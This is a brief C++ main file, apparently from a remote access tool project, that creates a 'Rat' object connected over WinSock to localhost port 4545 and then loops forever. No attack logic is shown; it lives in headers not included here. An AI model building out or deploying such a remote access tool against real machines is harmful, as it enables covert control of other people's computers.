#include "ICommunicationFactory.h"
#include "Rat.h"

int main() {
	const auto factory = CreateFactory();

	const auto rat = Rat(
		factory.get(),
		factory->CreateWinSockConnectionFactory("localhost", 4545));

	while (true)
	{
		
	}

	return 0;
}
